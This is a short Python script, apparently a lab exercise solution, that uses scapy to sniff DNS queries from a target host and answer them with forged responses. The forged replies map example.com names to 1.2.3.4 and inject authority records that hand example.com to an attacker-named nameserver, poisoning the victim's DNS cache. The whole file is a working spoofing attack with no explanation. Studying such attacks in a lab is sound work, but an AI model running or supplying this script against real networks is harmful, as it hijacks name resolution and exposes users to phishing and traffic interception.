#!/usr/bin/python3

from scapy.all import *
import sys

target = sys.argv[1]

def spoof_dns(pkt):
    if DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8'):
        old_ip = pkt[IP]
        old_udp = pkt[UDP]
        old_dns = pkt[DNS]

        ip = IP(dst=old_ip.src, src=old_ip.dst)
        udp = UDP(dport=old_udp.sport, sport=53)

        Anssec = DNSRR(rrname=old_dns.qd.qname, type='A', rdata='1.2.3.4', ttl=259200)
        
        NSsec1 = DNSRR(rrname="example.com", type='NS', rdata='ns.attacker32.com', ttl=259200)
        NSsec2 = DNSRR(rrname="google.com", type='NS', rdata='ns2.example.net', ttl=259200)
        
        
        dns = DNS(id=old_dns.id, qr=1, aa=1, qdcount=1, ancount=1, nscount=2, qd=old_dns.qd, an=Anssec, ns=NSsec1/NSsec2)
        spoofpkt = ip/udp/dns
        send(spoofpkt)

f = 'udp and (src host {} and dst port 53)'.format(target)
pkt = sniff(iface='br-22df8116f58d', filter=f, prn=spoof_dns)
